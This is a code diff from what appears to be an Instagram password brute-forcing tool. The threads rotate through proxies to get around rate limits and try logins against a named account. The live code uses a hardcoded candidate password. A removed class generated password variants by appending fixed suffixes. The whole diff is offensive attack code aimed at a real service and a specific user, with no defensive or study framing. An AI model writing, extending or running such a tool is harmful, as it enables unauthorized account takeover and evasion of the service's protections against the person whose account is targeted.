@@ -5,15 +5,17 @@ import threading
 
 import app.settings as settings
 
+from app.exceptions import InstagramTooManyRequests
 from app.lib.api import ProxyApi, InstagramApi
 
 
 class BrowserThread(threading.Thread):
 
-    def __init__(self, password_attempt_queue, proxy_queue, results_queue):
+    def __init__(self, user, passwords_queue, proxy_queue, results_queue):
         super(BrowserThread, self).__init__()
 
-        self.password_attempt_queue = password_attempt_queue
+        self.user = user
+        self.passwords_queue = passwords_queue
         self.proxy_queue = proxy_queue
         self.results_queue = results_queue
 
@@ -24,22 +26,39 @@ class BrowserThread(threading.Thread):
             try:
                 proxy = self.proxy_queue.get(True, 0.05)
             except queue.Empty:
+                print("No proxies")
                 continue
             else:
+                api = InstagramApi(self.user.username, proxy)
                 try:
-                    password = self.password_attempt_queue.get(True, 0.05)
-                except queue.Empty:
-                    continue
+                    results = api.login('Whispering1')
+                except InstagramTooManyRequests as e:
+                    print("TOO MAMY REQUESTS")
                 else:
-                    # We are not going to want to reget the token for each request
-                    api = InstagramApi(proxy)
-                    token = api.get_token()
-                    api.update_headers(token=token)
-                    results = api.login('nickmflorin', password)
-                    print('Got Results')
                     self.results_queue.put(results)
+            # try:
+            #     password = self.passwords_queue.get(True, 0.05)
+            # except queue.Empty:
+            #     print("No passwords")
+            #     continue
+            # else:
+            #     print(f"Got password {password} from queue")
+            # try:
+            #     proxy = self.proxy_queue.get(True, 0.05)
+            # except queue.Empty:
+            #     print("No proxies")
+            # else:
+            #     print(f"Got proxy {proxy} from queue.")
+                # We are not going to want to reget the token for each request
+                # api = InstagramApi(proxy)
+                # token = api.get_token()
+                # api.update_headers(token=token)
+                # results = api.login('nickmflorin', password)
+                # print('Got Results')
+                # self.results_queue.put(results)
 
     def join(self, timeout=None):
+        print("Setting BrowserThread stop request.")
         self.stop_request.set()
         super(BrowserThread, self).join(timeout)
 
@@ -66,57 +85,6 @@ class ProxyThread(threading.Thread):
                     self.proxy_queue.put(proxy)
 
     def join(self, timeout=None):
+        print("Setting ProxyThread stop request.")
         self.stop_request.set()
         super(ProxyThread, self).join(timeout)
-
-
-class PasswordThread(threading.Thread):
-
-    def __init__(self, base_password_queue, altered_password_queue, password_attempt_queue):
-        super(PasswordThread, self).__init__()
-
-        self.base_password_queue = base_password_queue
-        self.altered_password_queue = altered_password_queue
-        self.password_attempt_queue = password_attempt_queue
-
-        self.proxy_queue = queue.Queue()
-        self.proxy_pool = [
-            ProxyThread(self.proxy_queue, link) for link in settings.PROXY_LINKS
-        ]
-
-        self.stop_request = threading.Event()
-
-    def run(self):
-        # As long as we weren't asked to stop, try to take new tasks from the
-        # queue. The tasks are taken with a blocking 'get', so no CPU
-        # cycles are wasted while waiting.
-        # Also, 'get' is given a timeout, so stoprequest is always checked,
-        # even if there's nothing in the queue.
-        while not self.stop_request.isSet():
-            try:
-                password = self.base_password_queue.get(True, 0.05)
-            except queue.Empty:
-                continue
-            else:
-                password = password.replace('\n', '').replace('\r', '').replace('\t', '')
-                alterations = list(self._password_alterations(password))
-                self.altered_password_queue.put((self.name, password, alterations))
-
-    def join(self, timeout=None):
-        self.stop_request.set()
-        # proxy.stop_request.set() for proxy in self.proxy_pool ??
-        super(PasswordThread, self).join(timeout)
-
-    def _password_alterations(self, password):
-        first_level = ['', 'a', '13579', '24680', '09', '1523', '1719', '0609',
-            '0691', '0991', '36606', '3660664', '6951', '20002']
-        second_level = ['!', '!!', '!!!', '@', '`', '!a', '@!', 'a@!']
-
-        for alteration in first_level:
-            pw = password + alteration
-            self.password_attempt_queue.put(pw)
-            yield pw
-            for two_alteration in second_level:
-                pw = password + alteration + two_alteration
-                self.password_attempt_queue.put(pw)
-                yield pw
